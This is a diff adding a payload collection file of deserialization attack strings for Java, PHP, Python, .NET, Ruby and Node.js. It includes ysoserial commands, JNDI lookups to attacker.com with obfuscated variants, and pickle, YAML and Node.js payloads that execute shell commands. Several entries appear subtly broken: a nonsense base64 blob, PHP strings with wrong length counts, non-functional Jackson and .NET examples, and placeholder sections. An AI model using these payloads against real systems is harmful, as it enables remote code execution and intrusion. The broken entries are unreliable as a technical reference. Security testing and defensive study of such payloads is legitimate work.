@@ -1,0 +1,229 @@
+# Deserialization Payloads - Comprehensive Collection
+# Version: 1.0.18-20260301-Senin-1812-WIB
+# Category: Java/PHP/Python Deserialization
+
+# ============================================
+# JAVA DESERIALIZATION - COMMONS COLLECTIONS
+# ============================================
+
+# Gadget chain payloads for Apache Commons Collections
+# Basic payload structure
+AAIAACwAAAAQamlydmFzdG9yAGphdmEubGFuZy5SdW50aW1lAAAAAAAAAAACAAV2YWISTAABDSAAAAAAAAAABAAAAAAAAAAQAAAAAAAABAAAAAAAAAAEAAAAAAAAACgAAAAAAAAABAAAATAAAAB0AAAgAAAAQABAAAAAA
+# (base64 encoded Java deserialization payload)
+
+# ysoserial payload generators
+# CommonsCollections1
+java -jar ysoserial.jar CommonsCollections1 "command"
+java -jar ysoserial.jar CommonsCollections2 "command"
+java -jar ysoserial.jar CommonsCollections3 "command"
+java -jar ysoserial.jar CommonsCollections4 "command"
+java -jar ysoserial.jar CommonsCollections5 "command"
+java -jar ysoserial.jar CommonsCollections6 "command"
+
+# Spring Framework
+java -jar ysoserial.jar Spring1 "command"
+java -jar ysoserial.jar Spring2 "command"
+
+# Groovy
+java -jar ysoserial.jar Groovy1 "command"
+
+# ============================================
+# JAVA - JNDI INJECTION
+# ============================================
+
+# JNDI lookup
+${jndi:ldap://attacker.com/a}
+${jndi:rmi://attacker.com/a}
+${jndi:dns://attacker.com/a}
+${${lower:j}ndi:ldap://attacker.com/a}
+${${upper:j}ndi:ldap://attacker.com/a}
+${${lower:${lower:j}}ndi:ldap://attacker.com/a}
+
+# ============================================
+# JAVA - XMLDecoder
+# ============================================
+
+<java version="1.4.0" class="java.beans.XMLDecoder">
+<object class="java.lang.Runtime" method="getRuntime">
+<string>command</string>
+</object>
+</java>
+
+# ============================================
+# PHP DESERIALIZATION
+# ============================================
+
+# PHP unserialize manipulation
+O:4:"User":1:{s:4:"name";s:6:"admin";}
+O:4:"User":2:{s:4:"name";s:6:"admin";s:8:"password";s:10:"hacked123";}
+O:4:"User":3:{s:4:"name";O:8:"stdClass":0:{}}
+
+# PHP Object Injection
+# __wakeup bypass
+O:4:"User":1:{s:4:"name";s:6:"admin";}
+
+# __destruct exploitation
+O:6:"Logger":1:{s:11:"\0Logger\0filename";s:9:"/etc/passwd";}
+
+# ============================================
+# PYTHON PICKLE
+# ============================================
+
+# Pickle RCE
+c__builtin__
+eval
+(S"__import__('os').popen('id').read()"
+tR.
+
+# Alternative
+cos
+system
+(S"id"
+tR.
+
+# Pickle deserialization
+cos
+system
+(S"ls -la"
+tR.
+
+# ============================================
+# PYTHON YAML
+# ============================================
+
+# YAML deserialization
+!!python/object/apply:os.system ["id"]
+!!python/object/apply:os.popen ["id"]
+!!python/object/apply:subprocess.check_output ["ls"]
+!!python/object/__main__.os ["id"]
+
+# ============================================
+# PYTHON MARSHAL
+# ============================================
+
+# Marshal injection
+# (binary payload)
+
+# ============================================
+# .NET DESERIALIZATION
+# ============================================
+
+# JSON.NET
+{"$type":"System.Windows.Forms.Label,System.Windows.Forms","Text":"test"}
+
+# XmlSerializer
+<root>
+<type>System.Windows.Forms.Label,System.Windows.Forms</type>
+<type>System.Diagnostics.Process,System</type>
+</root>
+
+# BinaryFormatter
+# (binary serialized .NET object)
+
+# ============================================
+# RUBY MARSHAL
+# ============================================
+
+# Ruby Marshal.load
+# (binary payload)
+
+# YAML in Ruby
+--- !ruby/object:Kernel {}
+- !ruby/object:Gem::Specification
+  name: payload
+  version: '1.0'
+  specification_version: 4
+  executables:
+  - payload
+
+# ============================================
+# NODE.JS SERIALIZATION
+# ============================================
+
+# Node.js eval
+{"$eval":"require('child_process').execSync('id').toString()"}
+{"$function":"function(){return require('child_process').execSync('id').toString()}()"}
+
+# ============================================
+# JAVA - XSTREAM
+# ============================================
+
+<linked-hash-map>
+<entry>
+<string>foo</string>
+<string>bar</string>
+</entry>
+</linked-hash-map>
+
+# ============================================
+# JAVA - Jackson
+# ============================================
+
+{"@class":"java.lang.Runtime","method":"getRuntime","args":[]}
+
+# ============================================
+# PHP - SOAP
+# ============================================
+
+# SOAP XML injection
+<?xml version="1.0"?>
+<soap:Envelope>
+<soap:Body>
+<data>
+<value type="java:java.lang.Runtime">
+java.lang.Runtime.getRuntime().exec('id')
+</value>
+</data>
+</soap:Body>
+</soap:Envelope>
+
+# ============================================
+# JAVA - Hessian
+# ============================================
+
+# Hessian deserialization
+# (binary payload)
+
+# ============================================
+# Kryo
+# ============================================
+
+# Kryo serialization
+# (binary payload)
+
+# ============================================
+# FST
+# ============================================
+
+# FST serialization
+# (binary payload)
+
+# ============================================
+# JSON BO
+# ============================================
+
+# JSON Array overflow
+[1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30]
+
+# JSON deep nesting
+{"a":{"a":{"a":{"a":{"a":{"a":{"a":{"a":{"a":{"a":{"a":"value"}}}}}}}}}}}
+
+# ============================================
+# YAML VULNERABILITIES
+# ============================================
+
+# Ruby YAML
+--- !ruby/object:Kernel {}
+- !ruby/object:Gem::Specification
+  name: payload
+
+# Python YAML
+!!python/object/apply:os.system ['id']
+
+# ============================================
+# DO SERIALIZATION
+# ============================================
+
+# Doctrine Object
+O:29:"Doctrine\\ORM\\Proxy\\__CG__\\Class":1:{s:7:""*b"";O:4:"stdClass":0:{}}
+
